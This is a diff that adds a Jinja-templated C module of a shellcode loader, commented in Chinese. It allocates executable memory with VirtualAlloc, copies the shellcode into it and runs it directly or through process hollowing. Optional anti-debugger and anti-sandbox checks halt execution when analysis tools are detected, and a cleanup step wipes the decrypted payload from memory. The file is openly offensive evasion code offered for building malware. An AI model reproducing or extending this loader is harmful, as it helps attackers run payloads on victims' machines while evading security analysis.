@@ -1,0 +1,125 @@
+// Shellcode执行模块
+{% if enable_debug %}
+#define _DEBUG
+{% endif %}
+
+// 函数声明
+BOOL PreExecutionChecks();
+void PostExecutionCleanup(PBYTE shellcode, LPVOID execMem);
+BOOL ExecuteShellcode(PBYTE shellcode, DWORD size);
+
+// 执行前检查
+BOOL PreExecutionChecks() {
+#ifdef _DEBUG
+    printf("[*] 执行前安全检查\n");
+#endif
+    
+    {% if anti_debug %}
+    // 反调试检查
+    if (CheckDebugger()) {
+#ifdef _DEBUG
+        printf("[!] 检测到调试器，终止执行\n");
+#endif
+        return FALSE;
+    }
+    {% endif %}
+    
+    {% if anti_sandbox %}
+    // 反沙箱检查
+    if (CheckSandbox()) {
+#ifdef _DEBUG
+        printf("[!] 检测到沙箱环境，终止执行\n");
+#endif
+        return FALSE;
+    }
+    {% endif %}
+    
+#ifdef _DEBUG
+    printf("[*] 执行前检查通过\n");
+#endif
+    
+    return TRUE;
+}
+
+// 执行后清理
+void PostExecutionCleanup(PBYTE shellcode, LPVOID execMem) {
+#ifdef _DEBUG
+    printf("[*] 开始执行后清理\n");
+#endif
+    
+    {% if encrypt_shellcode %}
+    // 清理解密后的内存
+    if (shellcode) {
+        SecureZeroMemory(shellcode, 4096);  // 假设最大4KB
+    }
+    {% endif %}
+    
+    {% if not use_process_hollowing %}
+    // 释放执行内存
+    if (execMem) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
+#ifdef _DEBUG
+        printf("[*] 执行内存已释放\n");
+#endif
+    }
+    {% endif %}
+    
+#ifdef _DEBUG
+    printf("[*] 执行后清理完成\n");
+#endif
+}
+
+// 主执行函数
+BOOL ExecuteShellcode(PBYTE shellcode, DWORD size) {
+#ifdef _DEBUG
+    printf("[*] ========== 开始Shellcode执行 ==========\n");
+#endif
+    
+    // 1. 执行前检查
+    if (!PreExecutionChecks()) {
+        return FALSE;
+    }
+    
+    LPVOID execMem = NULL;
+    
+    {% if not use_process_hollowing %}
+    // 2. 写入内存（非进程空洞注入）
+    execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) {
+#ifdef _DEBUG
+        printf("[!] VirtualAlloc失败，错误码: %d\n", GetLastError());
+#endif
+        return FALSE;
+    }
+    memcpy(execMem, shellcode, size);
+    {% endif %}
+    
+#ifdef _DEBUG
+    printf("[*] 准备执行Shellcode，大小: %d 字节\n", size);
+    {% if use_process_hollowing %}
+    printf("[*] 使用进程空洞注入方式\n");
+    {% else %}
+    printf("[*] 使用常规内存执行方式\n");
+    {% endif %}
+#endif
+    
+    // 3. 执行Shellcode
+    {% if use_process_hollowing %}
+    ExecuteProcessHollowing(shellcode, size);
+    {% else %}
+    ExecuteLoader((PBYTE)execMem, size);
+    {% endif %}
+    
+#ifdef _DEBUG
+    printf("[*] Shellcode执行完成\n");
+#endif
+    
+    // 4. 执行后清理
+    PostExecutionCleanup(shellcode, execMem);
+    
+#ifdef _DEBUG
+    printf("[*] ========== Shellcode执行完成 ==========\n");
+#endif
+    
+    return TRUE;
+}
